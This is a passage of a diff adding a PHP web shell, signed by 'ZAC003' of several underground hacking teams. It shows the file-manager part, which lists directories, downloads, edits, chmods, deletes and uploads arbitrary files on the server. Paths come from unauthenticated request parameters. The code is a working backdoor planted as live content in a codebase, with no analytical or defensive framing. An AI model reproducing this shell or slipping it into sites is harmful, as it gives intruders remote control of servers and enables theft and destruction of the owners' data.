+							 if (@unlink ($filename) && @rmdir("$frpath"))
+							 {
+								echo "OK , Delete => $frpath ";
+							 }else
+							 {
+								echo "Connot Delete => $frpath ";
+							 }			 
+							}
+					}
+				}else{
+				if(@unlink ("$frpath")){
+					echo "OK , Delete => $frpath ";
+				}else{
+					echo "Connot Delete => $frpath ";
+				}
+				}
+			}
+			if(!empty($_GET['dir']) && !empty($_POST['MAX_FILE_SIZE'])){
+				$rpath=$_GET['dir'];
+				$uploadfile = $rpath."/" . $_FILES['userfile']['name'];
+				if (@move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) {
+					
+					echo "Upload File => $uploadfile";
+				}
+			}
+			$homedir=getcwd();
+			$dir=@realpath($_GET['dir'])."/";
+			echo "<br><b><p align='left'>&nbsp;Shell PaTh :</b> $homedir &nbsp;<b><form action=\"$self?ac=fm\" method='GET'> &nbsp;Change PaTh :</b>  <input type='hidden' name='ac' size='80' value='fm'>	 <input type='text' name='dir' size='80' value='$dir'>  <input type='submit' value='dir'>  </form><br><br>";
+			echo "
+
+<div align='center'>
+
+<table border='1' id='table1' style='border: 1px #333333' height='90' cellspacing='0' class='submit' cellpadding='0'>
+	<tr>
+		<td width='300' height='30' align='left'><b><font size='2'>File / Folder Name</font></b></td>
+		<td height='28' width='82' align='center'>
+		<font color='#008080' size='2'><b>Size KByte</b></font></td>
+		<td height='28' width='83' align='center'>
+		<font color='#008000' size='2'><b>Download</b></font></td>
+		<td height='28' width='66' align='center'>
+		<font color='#FF9933' size='2'><b>Edit</b></font></td>
+		<td height='28' width='75' align='center'>
+		<font color='#999999' size='2'><b>Chmod</b></font></td>
+		<td height='28' align='center'><font color='#FF0000' size='2'><b>Delete</b></font></td>
+	</tr>";
+		    if (@is_dir($dir)){
+		    if (@ $dh=opendir($dir)){
+		    while (($file = readdir($dh)) !== false) {
+		    $fsize=@round(@filesize($dir . $file)/1024);
+	echo " 
+	<tr>
+		<th width='250' height='22' align='left' nowrap>";
+		if (@is_dir($dir.$file))
+		{
+		echo "<a href='$self?ac=fm&dir=$dir$file'><span style='text-decoration: none'><font size='2' color='#F6F6F6'>&nbsp;$file <font color='#FF0000' size='1'>[DIR]</font>";
+		}
+		else {
+		echo "<font size='2' color='#F6F6F6'>&nbsp;$file ";
+		}
+		echo "</a></font></th>
+		<td width='113' align='center' nowrap><font color='#008080' size='2'><b>";
+		if (@is_file($dir.$file))
+		{
+		echo "$fsize KB";
+		}
+		else {
+		echo "&nbsp; ";
+		}
+		echo "
+		</b></font></td>
+		<td width='103' align='center' nowrap>";
+		if (@is_file($dir.$file)){
+		if (@is_readable($dir.$file)){
+		echo "<a href='$self?ac=fm&download=$dir$file'><span style='text-decoration: none'><font size='2' color='#008000'>[Download]";
+		}else {
+		echo "<font size='1' color='#FF0000'><b>No Readable</b>";
+		 }
+		}else {
+		echo "&nbsp;";
+		 }
+		echo "
+		</a></font></td>
+		<td width='77' align='center' nowrap>";
+		if (@is_file($dir.$file))
+		{
+		if (@is_readable($dir.$file)){
+		echo "<a target='_blank' href='$self?ac=fm&edit=$dir$file'><span style='text-decoration: none'><font color='#FF9933' size='2'>[Edit]";
+		}else {
+		echo "<font size='1' color='#FF0000'><b>No Readable</b>";
+		 }
+		}else {
+		echo "&nbsp;";
+		 }
+		echo "
+		</a></font></td>
+		<td width='86' align='center' nowrap>";
+		if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
+		echo "<font size='1' color='#999999'>Dont in windows";
+		}
+		else {
+		echo "<a href='$self?ac=fm&fchmod=$dir$file'><span style='text-decoration: none'><font size='2' color='#999999'>Chmod";
+		}
+		echo "</a></font></td>
+		<td width='86'align='center' nowrap><a href='$self?ac=fm&delete=$dir$file'><span style='text-decoration: none'><font size='2' color='#FF0000'>[Delete]</a></font></td>
+	</tr>";
+		      }
+		      closedir($dh);
+		    }}
+		    echo "</table><br>
+<form enctype='multipart/form-data' action='' method='POST'>
+ <input type='hidden' name='MAX_FILE_SIZE' value='300000' />
+ Upload File : <input name='userfile' type='file' />
+ <inpt type='hidden' name='fupload'  value='$dir'>
+ <input type='submit' value='UpLoAd FiLe' /><font size='1'> Not Copy() !</font>
+</form>   </div>";
+			break;
+			case 'about':
+			echo '  <center>  <table border="0" cellspacing="0" cellpadding="0">    <tr>       <td height="1" valign="top">     <p>class about {</p> <p>&nbsp;&nbsp;&nbsp; Name(&quot;AmIn SaKi&quot;),alias(&quot;ZAC003&quot;));</p><p>&nbsp;&nbsp;&nbsp; Age(17.5);</p> <p>&nbsp;&nbsp;&nbsp; WebSite(&quot;http://zac003.a20.ir&quot;);</p> <p>&nbsp;&nbsp;&nbsp; Email(&quot;ZAC003[at]Y!,MSN[dot]CoM&quot;);</p> <p>&nbsp;&nbsp;&nbsp; Greets(&quot;The-Outl4w , Aura , Sc0rpion(YaShAr) , Mormoroth , Black.Shadows , Hadi_hadi ZeDhAl And All Member of Aria-Security.Com AnD Virangar.NeT&quot;);</p><p>}</p></td>    </tr>  </table>  </center>';break;	}}?> </font></p></td></tr><tr><td width="822" height="1" valign="top" colspan="2"><hr class="t_footer" size=1 width="300"><p align="center"><font size="2">Writed By ZAC003<br>[<a href="http://zac003.a20.ir"> WhiteHat Nomads Group </a>]-[ <a href="http://aria-security.net">Aria Security Team</a> ]-[ <a href="http://virangar.net">Virangar UnderGround Team</a> ]-[ <a href="http://parsesecurity.net">Parse Security Team</a> ]</font></td></tr></table></center></div>
+ 
